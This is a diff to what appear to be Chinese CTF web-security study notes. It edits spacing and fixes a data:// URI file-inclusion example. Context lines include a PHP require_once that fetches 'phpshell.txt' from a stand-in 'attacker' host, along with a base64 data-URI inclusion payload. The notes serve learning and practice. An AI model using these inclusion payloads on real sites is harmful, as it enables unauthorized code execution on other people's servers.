@@ -311,6 +311,16 @@ mysql数据库仅有的
 
 ![image-20210419140921905](CTF-WEB篇.assets/image-20210419140921905.png)
 
+
+
+
+
+
+
+
+
+
+
 ## 文件上传
 
 
@@ -1069,7 +1079,7 @@ require_once "http://attacker/phpshell.txt?/action/m_share.php";
 + 利用Data URIs
 
   ~~~php
-  ?file=data://text/plain;base64;SSBsb3ZlIFBIUAo=
+  ?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=
   ~~~
 
   需要 `allow_url_include=On` 。
